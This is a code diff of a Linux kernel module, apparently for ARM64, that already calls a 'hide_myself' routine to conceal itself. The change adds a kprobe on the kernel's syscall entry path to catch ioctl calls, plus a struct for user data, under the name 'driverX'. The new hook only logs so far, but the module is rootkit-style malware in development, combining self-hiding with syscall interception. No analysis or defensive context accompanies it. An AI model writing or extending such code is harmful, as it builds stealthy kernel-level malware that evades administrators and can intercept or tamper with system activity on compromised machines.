@@ -57,14 +57,43 @@ static void __init hide_myself(void)
     }
 }
 
-static int __init hide_init(void)
+static struct kprobe kpp;
+
+// Structure for user data
+struct ioctl_cf {
+    int fd;
+    char name[15];
+};
+
+static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-    hide_myself();
-    printk("this: %p", THIS_MODULE); /* TODO: remove this line */
+    // Check if the syscall is ioctl (syscall number 29)
+    if (regs->regs[8] == 29) {
+        printk("driverX: ioctl called");
+    }
     return 0;
 }
 
-static void __exit hide_exit(void) {}
+static int __init hide_init(void)
+{
+    int ret;
+    kpp.symbol_name = "el0_svc_common";
+    kpp.pre_handler = handler_pre;
+
+    ret = register_kprobe(&kpp);
+    if (ret < 0) {
+        pr_err("driverX: Failed to register kprobe: %d\n", ret);
+        return ret;
+    }
+    
+    hide_myself();
+    printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
+    return 0;
+}
+
+static void __exit hide_exit(void) {
+    unregister_kprobe(&kpp);
+}
 
 module_init(hide_init);
 module_exit(hide_exit);
